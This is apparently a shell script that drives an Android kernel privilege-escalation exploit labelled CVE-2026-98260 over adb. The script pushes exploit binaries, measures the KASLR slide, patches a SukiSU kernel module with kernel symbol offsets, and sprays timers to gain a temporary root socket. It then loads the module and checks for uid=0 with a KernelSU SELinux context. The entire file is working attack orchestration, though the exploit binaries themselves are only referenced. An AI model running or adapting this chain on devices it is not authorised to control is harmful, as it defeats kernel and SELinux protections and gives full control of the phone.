#!/bin/sh
set -eu

usage() {
    cat <<'USAGE'
Usage: root-98260-sukisu.sh [options]

Runs the HOneClick CVE-2026-98260 chain on a fresh boot, loads the official
SukiSU Ultra LKM, initializes SukiSU userspace, and launches its manager.

Options:
  --serial SERIAL       Target adb serial (default: ANDROID_SERIAL or the only device)
  --apk PATH            Use a local SukiSU manager APK
  --ksud PATH           Use a local SukiSU ksud binary
  --lkm PATH            Use a local SukiSU aarch64 Android17-6.18 LKM
  --preflight           Run the non-destructive 98260 preflight before the exploit
  --no-manager-install  Do not download or install the SukiSU manager APK
  --reinstall-manager   Reinstall the pinned SukiSU manager even if already present
  --check               Validate target, profile, assets, and downloads only
  -h, --help            Show this help

Default SukiSU assets are downloaded from the official SukiSU-Ultra/SukiSU-Ultra
v4.3.0-r2 release and verified with fixed SHA-256 checksums.
USAGE
}

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)
SUKISU_TAG=v4.3.0-r2
SUKISU_APK_SHA=6fe64e7bcf9fd768c58f46afea2f27ee9fb85d2783472a7e81334df21e700636
SUKISU_KSUD_SHA=dec34535789f28e3ecda2788618a2e57c70f77b17b5ce129ff50026b9ba42f35
SUKISU_LKM_SHA=6f8cc8454f6b571c3aedcf65a4c3cd410bcf9c1d36dce51d51ab70eb9b07dd80
SUKISU_BASE=https://github.com/SukiSU-Ultra/SukiSU-Ultra/releases/download/$SUKISU_TAG
CACHE_DIR=${XDG_CACHE_HOME:-$HOME/.cache}/honeclick/sukisu/$SUKISU_TAG
TMP_DIR=${TMPDIR:-/tmp}
SERIAL=${ANDROID_SERIAL:-}
SUKISU_APK=${SUKISU_APK:-}
SUKISU_KSUD=${SUKISU_KSUD:-}
SUKISU_LKM=${SUKISU_LKM:-}
RUN_PREFLIGHT=0
INSTALL_MANAGER=1
REINSTALL_MANAGER=0
CHECK_ONLY=0

while [ $# -gt 0 ]; do
    case "$1" in
        --serial) [ $# -ge 2 ] || { echo "--serial requires a value" >&2; exit 2; }; SERIAL=$2; shift 2 ;;
        --apk) [ $# -ge 2 ] || { echo "--apk requires a value" >&2; exit 2; }; SUKISU_APK=$2; shift 2 ;;
        --ksud) [ $# -ge 2 ] || { echo "--ksud requires a value" >&2; exit 2; }; SUKISU_KSUD=$2; shift 2 ;;
        --lkm) [ $# -ge 2 ] || { echo "--lkm requires a value" >&2; exit 2; }; SUKISU_LKM=$2; shift 2 ;;
        --preflight) RUN_PREFLIGHT=1; shift ;;
        --no-manager-install) INSTALL_MANAGER=0; shift ;;
        --reinstall-manager) REINSTALL_MANAGER=1; shift ;;
        --check) CHECK_ONLY=1; shift ;;
        -h|--help) usage; exit 0 ;;
        *) echo "unknown option: $1" >&2; usage >&2; exit 2 ;;
    esac
done

sha256_file() {
    if command -v sha256sum >/dev/null 2>&1; then
        sha256sum "$1" | awk '{print $1}'
    else
        shasum -a 256 "$1" | awk '{print $1}'
    fi
}

download_checked() {
    path=$1
    url=$2
    expected=$3
    if [ -f "$path" ] && [ "$(sha256_file "$path")" = "$expected" ]; then
        return 0
    fi
    mkdir -p "$(dirname "$path")"
    tmp="$path.partial.$$"
    trap 'rm -f "$tmp"' EXIT HUP INT TERM
    echo "Downloading $(basename "$path") ..." >&2
    curl -fL --retry 3 --connect-timeout 15 -o "$tmp" "$url"
    actual=$(sha256_file "$tmp")
    if [ "$actual" != "$expected" ]; then
        echo "checksum mismatch for $path: $actual != $expected" >&2
        exit 1
    fi
    mv "$tmp" "$path"
    trap - EXIT HUP INT TERM
}

command -v adb >/dev/null 2>&1 || { echo "adb is required" >&2; exit 1; }
command -v python3 >/dev/null 2>&1 || { echo "python3 is required" >&2; exit 1; }

if [ -z "$SERIAL" ]; then
    devices=$(adb devices | awk '$2 == "device" {print $1}')
    count=$(printf '%s\n' "$devices" | awk 'NF {n++} END {print n+0}')
    if [ "$count" -ne 1 ]; then
        echo "expected exactly one online adb device, found $count; use --serial" >&2
        exit 1
    fi
    SERIAL=$devices
fi

adbx() {
    adb -s "$SERIAL" "$@"
}

device_shell() {
    adbx shell "$1" | tr -d '\r'
}

MODEL=$(device_shell 'getprop ro.product.model')
BUILD=$(device_shell 'getprop ro.build.display.id')
KERNEL=$(device_shell 'uname -r')
BOOT_ID=$(device_shell 'cat /proc/sys/kernel/random/boot_id')
MODULE_STATE=$(device_shell 'grep -qi kernelsu /proc/modules && echo LIVE || echo OFF')
PLANT_PID=$(device_shell 'pidof cve98260_plant 2>/dev/null || true')
ROOT_SOCKETS=$(device_shell "cat /proc/net/unix 2>/dev/null | grep -o '/data/local/tmp/cve98260-root[-A-Za-z0-9_.]*\.sock' | sort -u || true")
MANAGER_VERSION=$(device_shell "dumpsys package com.sukisu.ultra 2>/dev/null | sed -n 's/.*versionCode=\([0-9][0-9]*\).*/\1/p' | head -n 1")

if [ -z "$MANAGER_VERSION" ]; then
    MANAGER_STATE=absent
elif [ "$MANAGER_VERSION" -ge 41150 ]; then
    MANAGER_STATE=current
else
    MANAGER_STATE=outdated
fi

MANAGER_ACTION=keep
if [ "$INSTALL_MANAGER" -eq 1 ]; then
    if [ "$REINSTALL_MANAGER" -eq 1 ] || [ "$MANAGER_STATE" != current ]; then
        MANAGER_ACTION=install
    fi
fi

if [ "$MANAGER_ACTION" = install ] && [ -z "$SUKISU_APK" ]; then
    SUKISU_APK="$CACHE_DIR/SukiSU_v4.3.0-r2_41150-release.apk"
    download_checked "$SUKISU_APK" "$SUKISU_BASE/SukiSU_v4.3.0-r2_41150-release.apk" "$SUKISU_APK_SHA"
fi
if [ -z "$SUKISU_KSUD" ]; then
    SUKISU_KSUD="$CACHE_DIR/ksud-aarch64-linux-android"
    download_checked "$SUKISU_KSUD" "$SUKISU_BASE/ksud-aarch64-linux-android" "$SUKISU_KSUD_SHA"
fi
if [ -z "$SUKISU_LKM" ]; then
    SUKISU_LKM="$CACHE_DIR/lkm-aarch64-android17-6.18_kernelsu.ko"
    download_checked "$SUKISU_LKM" "$SUKISU_BASE/lkm-aarch64-android17-6.18_kernelsu.ko" "$SUKISU_LKM_SHA"
fi

if [ "$MANAGER_ACTION" = install ]; then
    [ -f "$SUKISU_APK" ] || { echo "missing manager APK: $SUKISU_APK" >&2; exit 1; }
fi
for path in "$SUKISU_KSUD" "$SUKISU_LKM"; do
    [ -f "$path" ] || { echo "missing file: $path" >&2; exit 1; }
done

profile_value() {
    python3 - "$ROOT/assets/exploit-profiles.json" "$KERNEL" "$1" <<'PY'
import json
import sys
from pathlib import Path
root = json.loads(Path(sys.argv[1]).read_text())
kernel = sys.argv[2]
key = sys.argv[3]
for profile in root.get("profiles", []):
    if profile.get("kernel") == kernel:
        value = profile.get(key)
        if value is None:
            raise SystemExit(f"profile missing {key}")
        print(value)
        raise SystemExit(0)
raise SystemExit(f"no 98260 profile for kernel: {kernel}")
PY
}

TIMER_LINK=$(profile_value timer_link)
CRED_LINK=$(profile_value cred_link)
SLIDE_SITE_LOW=$(profile_value slide_site_low)
SELINUX_LINK=$(profile_value selinux_link)
USER_NS=$(profile_value user_ns)
ROOT_USER=$(profile_value root_user)
INIT_GROUPS=$(profile_value groups)
UCOUNTS=$(profile_value ucounts)
KITIMER_SIZE=$(profile_value kitimer_size)
KITIMER_NODE=$(profile_value kitimer_node)
TASK_CRED=$(profile_value task_cred)
CRED_SIZE=$(profile_value cred_size)
SLAB_OBJECTS=$(profile_value slab_objects)
SLAB_PAGES=$(profile_value slab_pages)
SYMBOLS_ASSET=$(profile_value symbols_asset)
SYMBOLS_FILE="$ROOT/assets/$SYMBOLS_ASSET"
[ -f "$SYMBOLS_FILE" ] || { echo "missing symbol table: $SYMBOLS_FILE" >&2; exit 1; }

echo "device=$SERIAL"
echo "model=$MODEL"
echo "build=$BUILD"
echo "kernel=$KERNEL"
echo "boot_id=$BOOT_ID"
echo "module=$MODULE_STATE"
echo "plant_pid=${PLANT_PID:-none}"
echo "manager_package=com.sukisu.ultra"
echo "manager_version=${MANAGER_VERSION:-not-installed}"
echo "manager_action=$MANAGER_ACTION"

if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ -n "$PLANT_PID" ] || [ -n "$ROOT_SOCKETS" ]; then
        echo "check=blocked-by-existing-98260-state"
    elif [ "$MODULE_STATE" = LIVE ]; then
        echo "check=reboot-required-before-switching-lkm"
    else
        echo "check=ready"
    fi
    echo "sukisu_apk=${SUKISU_APK:-not-needed}"
    echo "sukisu_ksud=$SUKISU_KSUD"
    echo "sukisu_lkm=$SUKISU_LKM"
    echo "symbols=$SYMBOLS_FILE"
    exit 0
fi

if [ -n "$PLANT_PID" ] || [ -n "$ROOT_SOCKETS" ]; then
    echo "Existing 98260 state detected. Reboot before starting a new run." >&2
    exit 1
fi
if [ "$MODULE_STATE" = LIVE ]; then
    echo "A kernelsu module is already loaded. Reboot, then rerun this script." >&2
    exit 1
fi

if [ "$MANAGER_ACTION" = install ]; then
    echo "Installing SukiSU manager (installed=${MANAGER_VERSION:-none}) ..."
    adbx install -r "$SUKISU_APK" >/dev/null
else
    echo "SukiSU manager already present; skipping APK download/install."
fi

WORK=$(device_shell 'mktemp -d /data/local/tmp/honor-sukisu-XXXXXX')
[ -n "$WORK" ] || { echo "failed to create remote work directory" >&2; exit 1; }
SOCKET="/data/local/tmp/cve98260-root-$(printf '%s' "$BOOT_ID" | tr -cd 'A-Za-z0-9').sock"
LOCAL_PATCHED="$TMP_DIR/honeclick-sukisu-$SERIAL.ko"
trap 'rm -f "$LOCAL_PATCHED"' EXIT HUP INT TERM

echo "work=$WORK"
for local in \
    "$ROOT/assets/cve98260_plant" \
    "$ROOT/assets/cve98260_slide" \
    "$ROOT/assets/cve98260_su" \
    "$ROOT/assets/cve98260_module" \
    "$ROOT/assets/ksu_grant" \
    "$ROOT/assets/root_stage.sh" \
    "$SYMBOLS_FILE"; do
    adbx push "$local" "$WORK/" >/dev/null
done
adbx push "$SUKISU_KSUD" "$WORK/ksud" >/dev/null
adbx shell "chmod 755 '$WORK/cve98260_plant' '$WORK/cve98260_slide' '$WORK/cve98260_su' '$WORK/cve98260_module' '$WORK/ksu_grant' '$WORK/root_stage.sh' '$WORK/ksud'; chmod 644 '$WORK/$(basename "$SYMBOLS_FILE")'"

TASK_SIZE=$(profile_value task_size 2>/dev/null || true)
PROFILE_ARGS="--timer-link $TIMER_LINK --cred-link $CRED_LINK --selinux-link $SELINUX_LINK --user-ns $USER_NS --root-user $ROOT_USER --groups $INIT_GROUPS --ucounts $UCOUNTS --kitimer-size $KITIMER_SIZE --kitimer-node $KITIMER_NODE --task-cred $TASK_CRED --cred-size $CRED_SIZE --slab-objects $SLAB_OBJECTS --slab-pages $SLAB_PAGES"
[ -z "$TASK_SIZE" ] || PROFILE_ARGS="$PROFILE_ARGS --task-size $TASK_SIZE"

if [ "$RUN_PREFLIGHT" -eq 1 ]; then
    echo "Running non-destructive preflight ..."
    PREFLIGHT=$(device_shell "cd '$WORK' && ./cve98260_plant --preflight $PROFILE_ARGS")
    printf '%s\n' "$PREFLIGHT"
    printf '%s\n' "$PREFLIGHT" | grep -q '\[preflight\] RESULT=OK' || {
        echo "98260 preflight failed" >&2
        exit 1
    }
fi

echo "Measuring KASLR slide ..."
SLIDE_OUT=$(device_shell "cd '$WORK' && ./cve98260_slide --site-low $SLIDE_SITE_LOW")
SITE=$(printf '%s\n' "$SLIDE_OUT" | sed -n 's/.*\[slide\] raw .*site=\(0x[0-9A-Fa-f]*\).*/\1/p' | tail -n 1)
[ -n "$SITE" ] || { printf '%s\n' "$SLIDE_OUT"; echo "no slide site found" >&2; exit 1; }
SLIDE=$(python3 - "$SITE" "$TIMER_LINK" <<'PY'
import sys
slide = (int(sys.argv[1], 0) - int(sys.argv[2], 0)) & ((1 << 64) - 1)
if slide <= 0 or slide & 0xfff:
    raise SystemExit(f"invalid slide: {slide:#x}")
print(f"0x{slide:x}")
PY
)
echo "slide=$SLIDE"

python3 "$ROOT/scripts/patch-kernel-module.py" \
    "$SUKISU_LKM" "$LOCAL_PATCHED" \
    --kernel-release "$KERNEL" \
    --symbols "$SYMBOLS_FILE" \
    --slide "$SLIDE"
adbx push "$LOCAL_PATCHED" "$WORK/sukisu-patched.ko" >/dev/null
adbx shell "chmod 644 '$WORK/sukisu-patched.ko'"

echo "Starting the single 98260 instance ..."
START=$(device_shell "cd '$WORK' && rm -f plant.log '$SOCKET' && (PC98260_SOCK='$SOCKET' /system/bin/setsid ./cve98260_plant --slide $SLIDE $PROFILE_ARGS --padding-timers 4096 > plant.log 2>&1 < /dev/null & echo STARTED)")
printf '%s\n' "$START"
printf '%s\n' "$START" | grep -q STARTED || { echo "98260 failed to start" >&2; exit 1; }

echo "Waiting for the temporary root channel ..."
sleep 15
DEADLINE=$(( $(date +%s) + 300 ))
ROOTED=0
while [ "$(date +%s)" -le "$DEADLINE" ]; do
    ROOT_ID=$(device_shell "PC98260_SOCK='$SOCKET' '$WORK/cve98260_su' -c id 2>&1 || true")
    if printf '%s\n' "$ROOT_ID" | grep -q 'uid=0'; then
        ROOTED=1
        break
    fi
    TAIL=$(device_shell "tail -n 80 '$WORK/plant.log' 2>/dev/null || true")
    if printf '%s\n' "$TAIL" | grep -Eq 'unsafe state; holding process|leak failed'; then
        printf '%s\n' "$TAIL"
        echo "98260 entered a parked/failed state; reboot before retrying" >&2
        exit 1
    fi
    RUNNING=$(device_shell 'pidof cve98260_plant 2>/dev/null || true')
    if [ -z "$RUNNING" ] && [ -z "$TAIL" ]; then
        echo "98260 is not running and produced no log" >&2
        exit 1
    fi
    echo "still waiting: $(printf '%s\n' "$TAIL" | tail -n 1)"
    sleep 15
done
if [ "$ROOTED" -ne 1 ]; then
    echo "timed out waiting for the 98260 root channel" >&2
    exit 1
fi
echo "temporary_root=$ROOT_ID"

echo "Loading SukiSU LKM through the temporary root channel ..."
LOAD=$(device_shell "PC98260_SOCK='$SOCKET' '$WORK/cve98260_su' -c '$WORK/cve98260_module $WORK/sukisu-patched.ko' 2>&1")
printf '%s\n' "$LOAD"
device_shell 'grep -qi kernelsu /proc/modules && echo LIVE || echo OFF' | grep -q LIVE || {
    echo "SukiSU LKM did not load" >&2
    exit 1
}

echo "Initializing SukiSU userspace ..."
INIT=$(device_shell "cp '$WORK/root_stage.sh' /data/local/tmp/root_stage.sh && chmod 755 /data/local/tmp/root_stage.sh && cd '$WORK' && HONOR_WORK='$WORK' ./ksu_grant")
printf '%s\n' "$INIT"
printf '%s\n' "$INIT" | grep -q ROOT_STAGE_OK || { echo "SukiSU userspace initialization failed" >&2; exit 1; }

PROOF=$(device_shell "/system/bin/su -c 'id; grep CapEff /proc/self/status; getenforce'")
printf '%s\n' "$PROOF"
printf '%s\n' "$PROOF" | grep -q 'uid=0(root)' || { echo "su root verification failed" >&2; exit 1; }
printf '%s\n' "$PROOF" | grep -q 'context=u:r:ksu:s0' || { echo "KernelSU SELinux context missing" >&2; exit 1; }

if [ "$INSTALL_MANAGER" -eq 1 ]; then
    adbx shell 'monkey -p com.sukisu.ultra 1 >/dev/null 2>&1 || true'
fi

echo "SUKISU_ROOT_OK"
echo "serial=$SERIAL"
echo "kernel=$KERNEL"
echo "boot_id=$BOOT_ID"
echo "slide=$SLIDE"
echo "manager=com.sukisu.ultra"
echo "work=$WORK"
